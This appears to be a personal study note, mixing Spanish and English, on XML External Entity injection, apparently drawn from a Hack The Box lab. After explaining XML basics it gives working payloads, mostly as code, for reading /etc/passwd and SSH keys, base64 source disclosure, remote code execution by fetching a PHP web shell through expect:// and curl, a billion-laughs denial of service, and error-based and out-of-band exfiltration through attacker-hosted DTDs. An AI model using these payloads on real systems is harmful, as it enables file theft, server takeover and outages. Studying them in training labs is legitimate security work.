
`XML External Entity (XXE) Injection` Basicamente un LFI pero con XML

## Basics
### Tags

|Key|Definition|Example|
|---|---|---|
|`Tag`|The keys of an XML document, usually wrapped with (`<`/`>`) characters.|`<date>`|
|`Entity`|XML variables, usually wrapped with (`&`/`;`) characters.|`&lt;`|
|`Element`|The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.|`<date>01-01-2022</date>`|
|`Attribute`|Optional specifications for any element that are stored in the tags, which may be used by the XML parser.|`version="1.0"`/`encoding="UTF-8"`|
|`Declaration`|Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.|`<?xml version="1.0" encoding="UTF-8"?>`|

### XML DTD

`XML Document Type Definition (DTD)` allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file.
EJEMPLO : 

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

### XML Entities

We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the `ENTITY` keyword, which is followed by the entity name and its value, as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Once we define an entity, it can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g. `&company;`).

Most interestingly, however, we can `reference External XML Entities` with the `SYSTEM` keyword, which is followed by the external entity's path, as follows:


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```


## Exploit

### Identify

1. Ver que la web este usando input del usuario con xml, por ejemplo en un register page si rellenamos todo y luego enviamos los datos e interceptamos esa petición,si usa xml veremos algo así : 
<img width="1081" height="459" alt="image" src="https://github.com/user-attachments/assets/c2da45c6-71f6-402e-9ae3-a0f4ec5ecdb3" />


2. Vemos que en la respuesta se muestra nuestro email, vamos a crear una nueva entity meterla en el email y ver si se muestra :
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

<img width="1077" height="489" alt="image" src="https://github.com/user-attachments/assets/fa7181b2-7c89-4674-8b55-6105f113fe48" />



vemos que referenciando &company se ejecute y nos muestra la entity company por ende es vulnerable a XXE

**Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.


### Reading Sensitive Files


Una vez confirmada la vulnerabilidad podemos crear una nueva entity que sea para leer /etc/passwd -> hay que referenciarlo : &company;

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
con esto podemos leer incluso id_rsa para entrar al puerto ssh. 

-también podemos leer el codigo fuente(index.php) pero como el index usa carácteres raros que usa también xml pues nos dará error por ende ese archivo tenemos que referenciarlo en base 64 para que salga, si se usa php hay un filtro que lo hace: 

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```


### RCE
Si la web usa php y tiene el filtro expect entonces se pueden tirar comandos básicos `expect://id` pero la forma más eficiente es esta : 

1. 
```
bonack@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
bonack@htb[/htb]$ sudo python3 -m http.server 80
```

2.  
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

### Other XXE Attacks

-XXE que haga curl al server que queramos haciendo un SSRF
-XXE que haga un DoS por referenciarse muchas veces : 

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```


## Advanced File Disclosure
Cuando lo anterior no nos funciona  o cuando la web no usa php o cuando no nos enseña nada
### Advanced Exfiltration with CDATA


```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

la última parte del joined debería hacer que lo que queremos ver se enseñe pero xml no deja juntar entidades externas con internas , para bypassearlo usaremos `XML Parameter Entities` que es un tipo especial de entity que se referencia con % y que solo se puede usar en un DTD(explicacion de DTD en el apartado de basics)

PASOS:

1.  
```shell-session
bonack@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
bonack@htb[/htb]$ python3 -m http.server 8000
```
2. 
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
------------------------------------------------------------------------
Lo de arriba no se porq putas en htb no funciona pero si funciona : 

1. El archivo xxe.dtd
```<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents 
'%start;%file;%end;'>">
```
2. Payload ya en burp y despues de haber levantado nuestro server
```<!DOCTYPE email [
  <!ENTITY % dtd SYSTEM
  "http://10.10.16.10:8000/xxe.dtd">
  %dtd;
  %all;
]>
.
.
.
<email>
&fileContents;
</email>
```

### Error Based XXE

Si en la respuesta del servidor no nos enseñan nuestro input por ningun lado podemos tratar de forzar errores para ver si nos da algo de info, esto se puede lograr ya sea rompiendo alguna tag  `<roo>` o referenciando a una entidad que no exite:
<img width="1082" height="316" alt="image" src="https://github.com/user-attachments/assets/4aef1fa6-ab9b-4410-83a2-f6ba471c95df" />


ahora usaremos eso a nuestro favor para exfiltrar mas cosas

1. Hosteamos nuestro DTD
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
en este caso lo que hacemos es crear %file que si existe y %error que no existe para que luego al unirlos como `Advanced Exfiltration with CDATA` nos salte el error + el archivo /etc/hosts

2.  Llamamos a nuestro DTD externo en la webv
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

<img width="1080" height="274" alt="image" src="https://github.com/user-attachments/assets/48d3da11-4aae-4189-a1d3-321339676925" />



## Blind Data Exfiltration
Pa cuando no tenemos ni errores
### Out-of-band Data Exfiltration

esto lo haremos haciendo que el XXE lea el archivo y que lo pase a nuestro servidor

1. creamos un archivo (xxe.dtd) que tenga : 

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

2. ponemos esto en burp 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

## Automated XXE

con XXEinjector

1. Pillamos la request y la guardamos en un archivo para meterlo a la tool
2. magia
```shell-session
bonack@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```
Todo lo que encuentra se mete en un folder de logs que aparecerá nuevo, no hace falta levantar ningun server python el ya lo hace solo
